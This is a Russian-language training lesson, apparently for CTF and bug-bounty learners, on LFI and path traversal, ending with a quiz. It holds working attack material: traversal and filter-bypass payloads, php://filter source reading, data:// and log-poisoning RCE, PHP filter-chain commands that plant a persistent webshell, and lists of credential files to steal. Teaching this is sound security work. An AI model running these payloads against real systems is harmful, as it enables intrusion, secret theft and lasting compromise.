---
id: web-lfi-path-traversal
title: "LFI и Path Traversal: чтение файлов и RCE"
category: web
parent: web-architecture-advanced
difficulty: medium
order: 1
tags: [lfi, path-traversal, file-inclusion, wrappers, log-poisoning]
prerequisites: [web-architecture]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как выйти за пределы каталога, прочитать файлы, использовать PHP-обёртки и подняться до RCE."
---

Path Traversal (Directory Traversal) — выход за пределы разрешённого каталога через `../`. Local File Inclusion (LFI) — включение локального файла в код (обычно в PHP через `include`). LFI опаснее: она не только читает файлы, но и исполняет код, что часто приводит к RCE. Это один из самых практичных веб-классов — на CTF флаг почти всегда лежит в файле, доступном через LFI.

## Теория: path traversal vs LFI

**Path Traversal.** Приложение формирует путь из ввода: `open("/var/www/uploads/" + name)`. Если `name = ../../etc/passwd`, читаем произвольный файл. Ключ — недостаточная нормализация/валидация пути.

**LFI.** Приложение делает `include($_GET['page'] . '.php')`. Если `page = ../../etc/passwd`, файл включается (и, если это PHP, исполняется). Часто сопровождается **PHP wrappers**:

- `php://filter/convert.base64-encode/resource=index.php` — прочитать исходник PHP (без исполнения), получить код в base64.
- `php://input` — выполнить PHP из тела POST-запроса.
- `data://text/plain;base64,<...>` — выполнить PHP из data-URI.
- `expect://id` — выполнение команды (если расширение установлено).
- `zip://`, `phar://` — из архивов.
- `php://filter/.../resource=...` — обход фильтров и чтение.

**RFI (Remote File Inclusion).** Если включение разрешает URL (`allow_url_include=On`), можно подключить свой файл с кодом — мгновенный RCE.

## Инструменты: ручные payload, ffuf, обёртки

**Базовые проверки:**

```bash
curl -s "https://target/?page=../../../../etc/passwd"
curl -s "https://target/?page=....//....//....//etc/passwd"      # обход удаления ../
curl -s "https://target/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd"     # URL-кодирование
curl -s "https://target/?page=/etc/passwd"                        # абсолютный путь
```

**Обход фильтров** (когда `../` вырезается):

```
../            -> ....//   (двойной обход рекурсивного удаления)
../            -> ..%2f
../            -> %2e%2e%2f
../            -> ..%252f   (двойное кодирование)
../            -> ....\/    (Windows)
/etc/passwd    -> /etc//passwd, /etc/passwd%00 (null byte, старые версии)
```

**Обнаружение LFI-параметров** через ffuf:

```bash
ffuf -u 'https://target/?FUZZ=/etc/passwd' \
  -w params.txt -mr 'root:x:0:0' -t 30
```

`-mr` — match regex: ищем строку, которая точно есть в `/etc/passwd`.

**Чтение исходников через php://filter:**

```bash
curl -s "https://target/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
```

## Разобранный пример: LFI → исходники → RCE

Цель — `https://blog.example`, параметр `?lang=` включает файл.

Шаг 1. Проверяем traversal:

```bash
curl -s "https://blog.example/?lang=../../../../etc/passwd" | head
# root:x:0:0:root:/root:/bin/bash ...  -> LFI подтверждён
```

Шаг 2. Читаем исходник приложения (без исполнения) через фильтр:

```bash
curl -s "https://blog.example/?lang=php://filter/convert.base64-encode/resource=index.php" \
  | base64 -d | head -50
```

В коде видим: `include($_GET['lang'] . '.php');` — LFI с добавлением `.php`. Значит, для `php://input` суффикс `.php` помешает; обходим через null byte (старый PHP) или через `data://` с `?`.

Шаг 3. Пробуем `data://` (если `allow_url_include=On`):

```bash
curl -s "https://blog.example/?lang=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id"
# -> uid=33(www-data) ...
```

Здесь base64 декодируется в `<?php system($_GET['c']); ?>`.

Шаг 4. Если `data://` выключен — **log poisoning**. Инжектируем PHP в User-Agent, затем включаем лог:

```bash
curl -s "https://blog.example/" -A '<?php system($_GET["c"]); ?>'
curl -s "https://blog.example/?lang=/var/log/apache2/access.log&c=id"
# -> uid=33(www-data) ...
```

Шаг 5. Альтернатива — **/proc/self/environ** poisoning, **сессии** (PHP-сессия с payload), **почтовые логи** (`/var/mail/www-data`).

Шаг 6. Читаем флаг:

```bash
curl -s "https://blog.example/?lang=/flag.txt"
curl -s "https://blog.example/?lang=../../../../flag"
```

## Полезные файлы для чтения

Linux:
```
/etc/passwd                      — пользователи
/etc/shadow                      — хэши (нужен root)
/etc/hosts                       — внутренние хосты (для SSRF/пивота)
/proc/self/environ               — переменные окружения (часто секреты)
/proc/self/cmdline               — аргументы запуска
/var/log/apache2/access.log      — логи (log poisoning)
/root/.ssh/id_rsa                — приватные ключи
/home/user/.bash_history         — история команд
/app/config.py, .env             — конфиги/секреты
```

Windows:
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Users\<user>\.ssh\id_rsa
```

## Типичные ошибки новичков

- **Использовать слишком мало `../`.** Считайте глубину каталога или используйте избыток `../../../../../../` — лишние `../` в корне безвредны.
- **Забыть про URL-кодирование.** `../` в curl может нормализоваться клиентом/прокси; кодируйте `%2e%2e%2f`.
- **Путать LFI и path traversal.** Traversal — чтение; LFI — включение/исполнение. Для RCE нужна именно LFI или обёртка.
- **Не использовать `php://filter`.** Он позволяет читать исходники, что критично для поиска дальнейших багов (секретов, других включений).
- **Сдаваться при вырезании `../`.** `....//`, `..%2f`, двойное кодирование, абсолютные пути — обходов много.
- **Игнорировать обёртки.** `data://`, `php://input`, `expect://`, `zip://`/`phar://` часто дают RCE там, где traversal только читает.
- **Не проверять `allow_url_include`.** RFI возможен только при включённом параметре; но `data://` иногда работает и без него.
- **Не логировать путь.** Для log poisoning нужен известный путь лога; пробуйте стандартные для nginx/apache.

## Полный разбор: LFI → php://filter → filter chain RCE (с выводом)

End-to-end от traversal до RCE, включая обход суффикса `.php`.

Шаг 1. Подтверждаем LFI и читаем исходник без исполнения:

```bash
curl -s "https://blog.example/?lang=php://filter/convert.base64-encode/resource=index.php" \
  | base64 -d | head -30
# <?php
# $page = $_GET['lang'];
# include($page . '.php');        <- LFI с суффиксом .php
```

Суффикс `.php` мешает `php://input`/`data://` (сервер ищет `...php`). Обходы:

```bash
# null byte (PHP < 5.3.4): include(php://input%00.php)
curl -s "https://blog.example/?lang=php://input%00" --data '<?php system("id");?>'
# php://filter — суффикс не мешает чтению
curl -s "https://blog.example/?lang=php://filter/convert.base64-encode/resource=config.php" | base64 -d
```

Шаг 2. Если `allow_url_include=On`, `data://` (суффикс обходим `?`):

```bash
curl -s "https://blog.example/?lang=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+?&c=id"
# uid=33(www-data) ...
```

Шаг 3. Если `allow_url_include=Off` — filter chain (работает всегда):

```bash
python3 php_filter_chain_generator.py --chain '<?=`id`;?>' | tail -1 > chain.txt
curl -s "https://blog.example/?lang=$(cat chain.txt)" | head
# uid=33(www-data) gid=33(www-data) ...
```

Шаг 4. Закрепляемся: пишем webshell через цепочку и делаем read-back:

```bash
python3 php_filter_chain_generator.py \
  --chain '<?=`echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ | base64 -d > /var/www/html/s.php`;?>' \
  | tail -1 > chain.txt
curl -s -G "https://blog.example/" --data-urlencode "lang@chain.txt" -o /dev/null
curl -s "https://blog.example/s.php?c=id"
# uid=33(www-data) ...   -> канал подтверждён
```

## Reference-таблица: обёртки и обходы traversal

| Приём | Payload | Когда |
|-------|---------|-------|
| Базовый traversal | `../../../../etc/passwd` | нет фильтра |
| Двойной обход | `....//....//etc/passwd` | вырезают `../` рекурсивно |
| URL-encode | `%2e%2e%2f` | фильтр по сырому `../` |
| Двойной encode | `..%252f` | двойное декодирование |
| Абсолютный путь | `/etc/passwd` | префикс каталога |
| Null byte | `../../etc/passwd%00` | PHP < 5.3.4 |
| Windows | `..\..\windows\win.ini`, `....\/` | Windows-серверы |
| `php://filter` | `php://filter/convert.base64-encode/resource=x` | чтение исходников |
| Filter chain | `convert.iconv...` цепочка | RCE без allow_url_include |
| `data://` | `data://text/plain;base64,...` | allow_url_include=On |
| `php://input` | тело POST как PHP | allow_url_include=On |
| `zip://`/`phar://` | `zip://u/a.zip%23s.php` | есть загрузка |
| `expect://` | `expect://id` | модуль expect |

## Windows traversal и другие платформы

- **Windows:** разделители `\` и `/`; `..\..\windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`. Фильтры, режущие `/`, обходятся `\` и наоборот (`....\/`, `..%5c`).
- **Java:** `WEB-INF/web.xml`, `WEB-INF/classes/`, `META-INF/` — читайте конфиги и классы.
- **Node/Express:** `path.join` с `..` иногда проходит; проверьте `/%2e%2e/`, `/..;/`.
- **Кодировки:** overlong UTF-8 (`%c0%ae`), UTF-16 (`%u002e`), редко, но против наивных валидаторов.
- **Path normalization:** `//`, `/.`, `%2f` — расхождения между прокси и приложением дают обход.

## Что делать дальше / решение

1. **Подтвердить traversal** (`/etc/passwd`) и/или LFI (включение файла).
2. **Прочитать исходники** через `php://filter` — найти секреты и другие включения.
3. **Определить `allow_url_include`** (по поведению `data://`).
4. **RCE:** `data://`/`php://input` (если включено) или filter chain (всегда).
5. **Обойти суффикс/фильтры** (null byte, `?`, кодирование).
6. **Закрепиться** (webshell) + обязательный read-back (`id`).
7. **Альтернативы:** log poisoning, `/proc/self/environ`, PHP-сессии — если обёртки закрыты.

## Чек-лист тестирования LFI

1. **Найти параметр:** `?page=`, `?file=`, `?lang=`, `?include=`, `?template=`, `?view=`, `?path=`, `?doc=`, `?mod=`.
2. **Traversal-тест:** `../../../../etc/passwd`, затем абсолютный `/etc/passwd`.
3. **Обходы фильтра:** `....//`, `..%2f`, `%2e%2e%2f`, `..%252f`, `..\/` (Windows), null byte.
4. **Проверить суффикс:** если добавляется `.php`, ищите обход (`%00`, `?`, `php://filter`).
5. **Прочитать исходники:** `php://filter/convert.base64-encode/resource=index.php` → искать секреты/включения.
6. **Определить `allow_url_include`:** тест `data://`/`php://input`.
7. **RCE:** `data://`/`php://input` (если включено) или filter chain (всегда).
8. **Альтернативы:** log poisoning (`User-Agent` → лог), `/proc/self/environ`, PHP-сессии, `/var/mail`.
9. **Чтение секретов:** `.env`, `config.php`, `wp-config.php`, `/root/.ssh/id_rsa`, `.bash_history`, `docker-compose.yml`.
10. **Read-back:** подтвердить, что прочитанное/исполненное действительно достигнуто.

Полезные пути для быстрой проверки: `/etc/passwd`, `/etc/hostname`, `/proc/self/cmdline`, `/proc/self/environ`, `/app/.env`. Если `include` исполняет PHP — используйте `php://filter`, иначе файл исполнится, а не отобразится. Всегда проверяйте, что вывод пришёл из целевого файла (уникальная строка), а не из заглушки.

## LFI в CTF: типовые флаговые пути

- `/flag`, `/flag.txt`, `/flag{...}` в корне.
- `/app/flag`, `/var/www/flag.txt`, `/home/<user>/flag`.
- Переменные окружения: `/proc/self/environ` (иногда `FLAG=...`).
- Конфиги с секретами: `/app/.env`, `config.php`, `docker-compose.yml`.
- Через filter chain: сразу `system('cat /flag*')`.

Если `include` исполняет PHP и добавляет суффикс — комбинируйте `php://filter` (чтение) и filter chain (RCE). Всегда подтверждайте вывод уникальной строкой (сам флаг), а не общей заглушкой.

## Обёртки: сравнение чтения и исполнения

- `include('file.php')` — **исполняет** PHP. Читать исходник так нельзя.
- `readfile('file.php')` — **выводит** содержимое (в т.ч. PHP-код как текст) — полезно, если вывод в ответе.
- `file_get_contents` — возвращает содержимое в переменную (может попасть в ответ).
- `php://filter/convert.base64-encode/resource=` — гарантирует чтение без исполнения.

Если есть выбор между `include` и `readfile` — начинайте с `readfile`/`php://filter`: это быстрее даёт исходники и секреты, а RCE через filter chain стройте уже после разведки кода.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Чем LFI отличается от path traversal?"
  options:
    - "Ничем"
    - "LFI включает файл (исполняет), traversal только читает"
    - "Traversal только на Windows"
    - "LFI — это SSRF"
  answer: 1
  explanation: "LFI даёт исполнение, что ведёт к RCE."
- question: "Какой wrapper читает исходник PHP в base64?"
  options:
    - "`php://input`"
    - "`php://filter/convert.base64-encode/resource=`"
    - "`data://`"
    - "`expect://`"
  answer: 1
  explanation: "Позволяет читать код без исполнения."
- question: "Как обойти фильтр, вырезающий `../`?"
  options:
    - "`....//`"
    - "`..\\`"
    - "`--`"
    - "`%00`"
  answer: 0
  explanation: "Двойной обход рекурсивного удаления."
- question: "Что такое log poisoning при LFI?"
  options:
    - "Заполнение логов"
    - "Инжект PHP в лог (например, User-Agent) и включение лога через LFI"
    - "SQLi в логах"
    - "XSS в логе"
  answer: 1
  explanation: "Лог становится исполняемым файлом."
- question: "Какой файл содержит переменные окружения процесса на Linux?"
  options:
    - "`/etc/hosts`"
    - "`/proc/self/environ`"
    - "`/etc/passwd`"
    - "`/var/log/syslog`"
  answer: 1
  explanation: "Часто содержит секреты."
```

## Где пригодится

- **CTF (Web):** LFI — прямой путь к флагу (он лежит в файле); wrappers и log poisoning — стандартные шаги.
- **Bug bounty:** LFI/path traversal на продакшене = high/critical, особенно если ведёт к чтению конфигов или RCE.
- **Пентест:** чтение `/etc/passwd` и конфигов — типичный этап пост-эксплуатации и латерального движения.
- **Работа (AppSec):** нормализация путей, whitelisting включаемых файлов, отключение `allow_url_include` — базовые меры защиты.
